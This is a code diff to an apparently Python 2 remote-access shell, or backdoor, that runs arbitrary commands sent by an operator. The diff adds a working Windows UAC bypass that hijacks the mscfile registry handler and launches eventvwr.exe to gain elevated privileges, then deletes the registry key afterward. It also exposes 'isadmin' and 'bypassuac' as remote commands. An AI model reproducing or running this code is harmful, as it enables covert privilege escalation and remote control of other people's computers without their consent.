@@ -11,8 +11,20 @@ from Crypto.Random import random
 import zlib
 import base64
 import hashlib
+import ctypes
+import getpass
+import sys
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
+if os.name == "nt":
+	import win32net
+
+logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
+
+def windows_only(func):
+	def tester(*args):
+		if os.name != "nt": return "Command not available on non-windows OS."
+		else: return func(*args)
+	return tester
 
 class StoppableThread(threading.Thread):
 	"""
@@ -54,6 +66,10 @@ class Channel:
 	def write_output(self, data):
 		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
 		self.output_queue.put(self.id+data)
+		
+	def signal(self, data):
+		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data)
+		self.output_queue.put(chr(254)+data)
 		
 	def __repr__(self):
 		print "Channel ID: "+str(ord(id))
@@ -160,6 +176,7 @@ class Transport:
 		ct = threading.currentThread()
 		while not ct.stopped():
 			signal = self.signal_channel.read_input()
+			logging.info("Got signal: "+signal)
 			if signal == "CREATE_CHANNEL":
 				pass
 				
@@ -203,10 +220,62 @@ class Filesystem:
 			return ""
 		except Exception as e:
 			return str(e)
+			
+class Miscellaneous:
+	"""
+	Miscellaneous functions that don't fit into any other category.
+	"""
+	def isadmin(self): # Check if current process has admin privs
+		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
+		else: return os.geteuid() == 0
+		
+	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
+		return ''.join([i if ord(i) < 128 else '' for i in string])
+		
+	@windows_only
+	def is_user_in_group(self, group, member): # Check if user is member of a group.
+		members = win32net.NetLocalGroupGetMembers(None, group, 1)
+		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
+		return False
+	 
+	@windows_only
+	def name_of_admin_group(self): # Get name of Administrators group.
+		for line in execute.execute_shell_command("whoami /groups").splitlines():
+			if "S-1-5-32-544" in line:
+				return line.split()[0].split("\\")[1]
+		
+class Privilege_Escalation:
+	"""
+	Functions related to escalating privileges.
+	"""
+		
+	@windows_only
+	def bypass_uac(self):
+		logging.info("Attempting to bypass UAC.")
+		if misc.isadmin():
+			logging.debug("UAC bypass failed: Process already has admin privileges.")
+			return "You already have admin privileges!"
+		 
+		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
+			logging.debug("UAC bypass failed: Current user is not part of admin group.")
+			return "Current user is not part of admin group."
+		 
+		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
+			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
+			return "UAC is disabled or notification policy is set to 'Always'"
+			
+		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
+		logging.debug(execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"'))
+		os.startfile("eventvwr.exe")
+		time.sleep(2)
+		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
+		return "BG_NEW_SESH"
 		
 execute = Execute()
 fs = Filesystem()
-			
+misc = Miscellaneous()
+privesc = Privilege_Escalation()
+	
 class Shell:
 	"""
 	This is where the all remote control magic happens.
@@ -222,9 +291,13 @@ class Shell:
 			data = self.recv()
 			if data == "CONN_LOST":
 				return False
-			if data.startswith("cd"):
+			elif data.startswith("cd"):
 				data = data[3:]
 				output = fs.change_directory(data.strip())
+			elif data == "isadmin":
+				output = str(misc.isadmin())
+			elif data == "bypassuac":
+				output = privesc.bypass_uac()
 			else:
 				output = execute.execute_shell_command(data)
 				
